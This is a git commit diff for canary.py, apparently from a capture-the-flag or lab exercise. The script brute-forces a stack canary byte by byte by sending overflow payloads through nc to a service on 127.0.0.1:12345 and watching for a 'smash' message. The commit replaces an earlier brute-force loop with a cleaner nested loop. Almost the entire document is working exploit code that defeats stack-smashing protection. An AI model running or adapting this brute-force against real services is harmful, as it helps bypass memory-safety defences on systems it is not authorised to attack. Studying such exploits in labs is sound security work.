1c093093de300cb123ebb1b19760d4d5feb41e9a
ChoKyuWon <yyj10137@gmail.com>
2019-09-26 14:55:36 +0900

    fix

--- canary.py
+++ canary.py
@@ -5,16 +5,16 @@ import math
 from time import sleep
 
 canary = b'\x00'
-tmp = 0
-while True:
-    payload = b'a'*10 + canary + (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
-    p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
-    output = p.communicate(input=payload)[0]
-    if b'smash' not in output:
-        canary += (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
-        print('canary:', canary)
-        tmp = 0
-    print(payload)
-    print("output :", output)
-    tmp += 1
-    sleep(0.1)
+for k in range(7):
+    for i in range(0, int(0x100)):
+        test = i.to_bytes(1,byteorder='big')
+        payload = b'a'*10 + canary + test
+        p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+        output = p.communicate(input=payload)[0]
+        if b'smash' not in output:
+            canary += test
+            break
+        #print('payload:', payload)
+        #print('output :', output)
+
+print(canary)
